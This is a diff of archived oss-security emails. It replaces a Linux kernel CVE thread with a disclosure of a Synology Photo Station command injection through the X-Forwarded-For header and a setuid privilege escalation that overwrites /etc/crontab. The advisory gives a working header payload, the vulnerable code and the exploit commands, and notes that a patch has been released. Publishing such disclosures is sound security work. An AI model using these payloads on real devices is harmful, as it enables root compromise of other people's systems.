@@ -1,48 +1,80 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/29/15
-Message-ID: <VI1PR06MB1087A485F2E0965FAFE79083A9CE0@VI1PR06MB1087.eurprd06.prod.outlook.com>
-Date: Thu, 29 Sep 2016 13:54:53 +0000
-From: Mario Pirker <mpirker@...ux.com>
-To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-CC: "cve-assign@...re.org" <cve-assign@...re.org>
-Subject: Re: CVE request - Linux kernel through 4.6.2 allows escalade privileges via IP6T_SO_SET_REPLACE compat setsockopt call
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/28/7
+Message-ID: <3AE6A5EB7FBC894F91BF6F1F3B80613B0121FFFCB8@adcexmbx03.tw.trendnet.org>
+Date: Thu, 28 Jan 2016 06:31:46 +0000
+From: "lucas_leong@...nd.com.tw" <lucas_leong@...nd.com.tw>
+To: "cve-assign@...re.org" <cve-assign@...re.org>
+CC: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: CVE request: Synology Photo Station command injection and privilege escalation
 Content-Type: text/plain; charset=utf-8
 
-For completeness - here is a link to the advisory released by NCC Group:
-https://github.com/nccgroup/TriforceLinuxSyscallFuzzer/tree/master/crash_reports/report_compatIpt
-
-Thanks.
-Mario
-
-> Am 29.09.2016 um 15:45 schrieb Greg KH <greg@...ah.com>:
-> 
-> On Thu, Sep 29, 2016 at 07:43:35AM +0000, 张谦 wrote:
->> Hi there,
->> 
->> I found a memory corruption vulnerabiliry in Linux kernel through 4.6.2, and I
->> have a working exploit to escalade privileges which requires the ip6_tables
->> module to be loaded, that it is properly blocked on all up-to-date versions.
->> 
->> Due to the number of users running vulnerable code(not update to 4.7 or
->> higher), and that this exploit is only available to security researchers and
->> kernel packagers upon request but that I don't want it to spread.
->> 
->> 
->> 
->> I have reported this issue to Linux kernel official and they have already fixed
->> this.
-> 
-> Note, this was fixed many months ago, in May of 2016, and went into the
-> stable kernel updates in June, 2016.  Any distro that updated to the
-> stable kernel updates received this fix then.
-> 
-> Any distro that hasn't updated their kernel since then, well, you need
-> to revaluate your trust of such a distro :)
-> 
-> thanks,
-> 
-> greg k-h
+Title: Synology Photo Station command injection and privilege escalation
+Vendor: Synology (https://www.synology.com/)
+Product: Photo Station
+Status: Patch released
+Affected: version <= 6.3-2954
+Impact: Any guest account can execute arbitrary command with root permission
 
 
 
-Download attachment "signature.asc" of type "application/pgp-signature" (843 bytes)
+Vulnerability 1: Command injection
+
+The vulnerability is in appstore/PhotoStation/photo/login.php
+
+118     if ($x_forward) {
+119         $ip = $x_forward;
+120     }
+...
+176     $commend = "/usr/syno/bin/synoautoblock --reset \"".$ip."\"";
+177     @system($commend, $retval);
+
+Since, the page did not filter X-Forwarded-For header and lead to command injection
+After sending a crafted header, a command is executed under http permission
+
+X-Forwarded-For: ";id>/tmp/hack;"
+
+> cat /tmp/hack
+uid=1023(http) gid=1023(http) groups=1023(http)
+
+
+
+Vulnerability 2: Privilege escalation
+
+For the privilege escalation vulnerability, it is a simple setuid problem.
+
+> ls -al /usr/syno/bin/synophoto_dsm_user
+lrwxrwxrwx    1 root     root            56 Sep 16 22:53 /usr/syno/bin/synophoto_dsm_user -> /var/packages/PhotoStation/target/bin/synophoto_dsm_user
+> ls -al /var/packages/PhotoStation/target/bin/synophoto_dsm_user
+-rwsr-xr-x    1 root     root         30520 Jul  6 19:55 /var/packages/PhotoStation/target/bin/synophoto_dsm_user
+> ls -al /tmp/hack2
+-rw-rw-rw-    1 http     http            15 Sep 23 00:24 /tmp/hack2
+> cat /tmp/hack2
+pwned by lucas
+> ls -al /etc/crontab
+-rw-r--r--    1 root     root           404 Aug 27 13:25 /etc/crontab
+> synophoto_dsm_user --copy-no-ea /tmp/hack2 /etc/crontab
+> cat /etc/crontab
+pwned by lucas
+
+After overwritng crontab, arbitrary process can be executed with root permission
+
+
+Patch:
+Vendor released the patch and the issue has solved in 6.3-2958
+https://www.synology.com/en-us/releaseNote/PhotoStation
+
+Timeline:
+2015/09/23         Vendor Notified
+2015/10/01         Patch Released
+
+
+
+<table class="TM_EMAIL_NOTICE"><tr><td><pre>
+TREND MICRO EMAIL NOTICE
+The information contained in this email and any attachments is confidential 
+and may be subject to copyright or other intellectual property protection. 
+If you are not the intended recipient, you are not authorized to use or 
+disclose this information, and we request that you notify us by reply mail or
+telephone and delete the original message from your mail system.
+</pre></td></tr></table>
+
